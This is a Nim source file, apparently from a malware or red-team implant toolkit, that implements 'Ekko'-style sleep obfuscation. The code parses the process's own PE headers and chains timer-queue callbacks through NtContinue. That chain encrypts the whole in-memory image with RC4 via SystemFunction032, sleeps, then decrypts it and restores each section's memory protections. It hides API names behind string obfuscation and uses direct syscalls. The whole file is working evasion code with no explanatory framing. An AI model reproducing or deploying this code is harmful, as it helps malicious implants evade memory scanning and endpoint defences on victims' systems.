import ../../utils/global
import ../../utils/winapi/handlers
import ../../utils/winapi/syscall
import ../../utils/winapi/ssn
import ../../utils/winapi/utils

const
  ctxSize = 0x1000
  ropStep = 100.culong
  maxSections = 11
  maxRop = 6 + maxSections + 1

type
  Ustr = object
    length*, maximumLength*: culong
    buffer*: pointer
  Region = object
    base*: pointer
    size*: culong
    prot*: culong

template ctxFlag(p: pointer): ptr culong =
  # Returns a pointer to the context flags
  cast[ptr culong](cast[int](p) + 0x30)
template ctxRip(p: pointer): ptr uint64 =
  # Returns a pointer to the context instruction pointer
  cast[ptr uint64](cast[int](p) + 0xF8)
template ctxRsp(p: pointer): ptr uint64 =
  # Returns a pointer to the context stack pointer
  cast[ptr uint64](cast[int](p) + 0x98)
template ctxRcx(p: pointer): ptr uint64 =
  # Returns a pointer to the context rcx register
  cast[ptr uint64](cast[int](p) + 0x80)
template ctxRdx(p: pointer): ptr uint64 =
  # Returns a pointer to the context rdx register
  cast[ptr uint64](cast[int](p) + 0x88)
template ctxR8(p: pointer): ptr uint64 =
  # Returns a pointer to the context r8 register
  cast[ptr uint64](cast[int](p) + 0xB8)
template ctxR9(p: pointer): ptr uint64 =
  # Returns a pointer to the context r9 register
  cast[ptr uint64](cast[int](p) + 0xC0)

template prepRop(dst, src: pointer; fn: pointer) =
  # Copies a context and points the instruction pointer at a function
  copyMem(dst, src, ctxSize)
  ctxFlag(dst)[] = contextFull
  ctxRip(dst)[] = cast[uint64](fn)
  ctxRsp(dst)[] = ctxRsp(dst)[] - 8

proc eventSet(ev: pointer; fired: culong) {.stdcall.} =
  # Sets the event and ignores the fired flag
  discard fired
  discard ntSetEvent(ev)

proc deleteTimerQueueSafe(queue: pointer) =
  # Deletes the timer queue and waits when the call is pending
  if queue == nil:
    return
  var evDel: pointer
  if ntCreateEvent(addr evDel, eventAllAccess, nil, notificationEvent, 0) != 0:
    discard rtlDeleteTimerQueue(queue)
    return
  let st = rtlDeleteTimerQueueEx(queue, evDel)
  if st == 0x103:
    discard waitForObject(evDel)
  elif st != 0:
    discard rtlDeleteTimerQueue(queue)
  discard ntCloseHandle(evDel)

proc ekkoObf*(ms: culong): bool =
  # Encrypts the image and sleeps through a timer queue
  result = false
  if not syscallReady and not prepareSyscalls():
    return
  let base = getModuleHandleA(currentModule = true)
  if base == nil:
    return
  let p = cast[ptr UncheckedArray[byte]](base)
  if p[0] != 0x4D'u8 or p[1] != 0x5A'u8:
    return
  let peOff = cast[ptr culong](cast[int](base) + 0x3C)[]
  let nt = cast[pointer](cast[int](base) + peOff.int)
  if cast[ptr culong](nt)[] != 0x00004550:
    return
  let imgSize = cast[ptr culong](cast[int](nt) + 0x50)[]
  if imgSize == 0:
    return
  let nsec = cast[ptr uint16](cast[int](nt) + 6)[]
  let optSize = cast[ptr uint16](cast[int](nt) + 20)[]
  if nsec == 0 or nsec > maxSections:
    return
  var sec = cast[int](nt) + 24 + optSize.int
  var regions: array[maxSections + 1, Region]
  var nRegions = 0
  var firstVA = 0.culong
  for i in 0 ..< nsec.int:
    let va = cast[ptr culong](sec + 12)[]
    let vsize = cast[ptr culong](sec + 8)[]
    if i == 0:
      firstVA = va
    if vsize > 0 and va > 0 and va < imgSize:
      let chars = cast[ptr culong](sec + 36)[]
      var prot = PAGE_READONLY
      if (chars and culong(0x20000000)) != 0:
        prot = if (chars and culong(0x80000000)) != 0: PAGE_EXECUTE_READWRITE else: PAGE_EXECUTE_READ
      elif (chars and culong(0x80000000)) != 0:
        prot = PAGE_READWRITE
      var sz = vsize
      if va.int + sz.int > imgSize.int:
        sz = imgSize - va
      regions[nRegions] = Region(base: cast[pointer](cast[int](base) + va.int), size: sz, prot: prot)
      inc nRegions
    sec += 40
  if nRegions == 0 or firstVA == 0:
    return
  regions[nRegions] = Region(base: base, size: firstVA, prot: PAGE_READONLY)
  inc nRegions

  var key: array[16, byte]
  var tick = getTickCount()
  for i in 0 ..< key.len:
    key[i] = byte((tick + culong(i * 17)) and 0xFF)
    tick = (tick shl 5) or (tick shr 27)

  var img = Ustr(length: imgSize, maximumLength: imgSize, buffer: base)
  var k = Ustr(length: 16, maximumLength: 16, buffer: addr key[0])

  var timerCtx {.align(16).}: array[ctxSize, byte]
  var rops {.align(16).}: array[maxRop, array[ctxSize, byte]]
  var value: culong
  var queue, evStart, evDone, evReady: pointer
  var delay = ropStep

  let cap = rtlCaptureContext()
  let cont = ntContinue()
  let setEv = ntSetEventStub()
  let evSet = cast[pointer](eventSet)
  let wfs = load(obf("WaitForSingleObjectEx"))
  let vpt = load(obf("VirtualProtect"))
  let adv = loadLibraryA(obf("advapi32.dll"))
  let rc4 = if adv == nil: nil else: getProcAddress(adv, obf("SystemFunction032"))
  if cap == nil or cont == nil or setEv == nil or wfs == nil or vpt == nil or rc4 == nil:
    return

  queue = rtlCreateTimerQueue()
  if queue == nil:
    return
  if ntCreateEvent(addr evReady, eventAllAccess, nil, notificationEvent, 0) != 0:
    deleteTimerQueueSafe(queue)
    return
  if ntCreateEvent(addr evStart, eventAllAccess, nil, notificationEvent, 0) != 0:
    deleteTimerQueueSafe(queue)
    discard ntCloseHandle(evReady)
    return
  if ntCreateEvent(addr evDone, eventAllAccess, nil, notificationEvent, 0) != 0:
    deleteTimerQueueSafe(queue)
    discard ntCloseHandle(evReady)
    discard ntCloseHandle(evStart)
    return

  delay += ropStep
  discard rtlCreateTimer(queue, cap, addr timerCtx[0], delay, 0, wtExecuteInTimerThread)
  delay += ropStep
  if rtlCreateTimer(queue, evSet, evReady, delay, 0, wtExecuteInTimerThread) != 0:
    deleteTimerQueueSafe(queue)
    discard ntCloseHandle(evReady)
    discard ntCloseHandle(evStart)
    discard ntCloseHandle(evDone)
    return
  if waitForObject(evReady) != 0:
    deleteTimerQueueSafe(queue)
    discard ntCloseHandle(evReady)
    discard ntCloseHandle(evStart)
    discard ntCloseHandle(evDone)
    return

  prepRop(addr rops[0][0], addr timerCtx[0], wfs)
  ctxRcx(addr rops[0][0])[] = cast[uint64](evStart)
  ctxRdx(addr rops[0][0])[] = cast[uint64](INFINITE)
  ctxR8(addr rops[0][0])[] = 0
  prepRop(addr rops[1][0], addr timerCtx[0], vpt)
  ctxRcx(addr rops[1][0])[] = cast[uint64](base)
  ctxRdx(addr rops[1][0])[] = cast[uint64](imgSize)
  ctxR8(addr rops[1][0])[] = cast[uint64](PAGE_READWRITE)
  ctxR9(addr rops[1][0])[] = cast[uint64](addr value)
  prepRop(addr rops[2][0], addr timerCtx[0], rc4)
  ctxRcx(addr rops[2][0])[] = cast[uint64](addr img)
  ctxRdx(addr rops[2][0])[] = cast[uint64](addr k)
  prepRop(addr rops[3][0], addr timerCtx[0], wfs)
  ctxRcx(addr rops[3][0])[] = cast[uint64](currentProcess)
  ctxRdx(addr rops[3][0])[] = cast[uint64](delay + ms)
  ctxR8(addr rops[3][0])[] = 0
  prepRop(addr rops[4][0], addr timerCtx[0], rc4)
  ctxRcx(addr rops[4][0])[] = cast[uint64](addr img)
  ctxRdx(addr rops[4][0])[] = cast[uint64](addr k)
  for r in 0 ..< nRegions:
    prepRop(addr rops[5 + r][0], addr timerCtx[0], vpt)
    ctxRcx(addr rops[5 + r][0])[] = cast[uint64](regions[r].base)
    ctxRdx(addr rops[5 + r][0])[] = cast[uint64](regions[r].size)
    ctxR8(addr rops[5 + r][0])[] = cast[uint64](regions[r].prot)
    ctxR9(addr rops[5 + r][0])[] = cast[uint64](addr value)
  prepRop(addr rops[5 + nRegions][0], addr timerCtx[0], setEv)
  ctxRcx(addr rops[5 + nRegions][0])[] = cast[uint64](evDone)
  ctxRdx(addr rops[5 + nRegions][0])[] = 0
  let total = 6 + nRegions

  for i in 0 ..< total:
    delay += ropStep
    discard rtlCreateTimer(queue, cont, addr rops[i][0], delay, 0, wtExecuteInTimerThread)

  result = ntSignalAndWait(evStart, evDone, 0, nil) == 0

  deleteTimerQueueSafe(queue)
  discard ntCloseHandle(evReady)
  discard ntCloseHandle(evStart)
  discard ntCloseHandle(evDone)
  zeroMem(addr key[0], key.len)
  zeroMem(addr timerCtx[0], ctxSize)
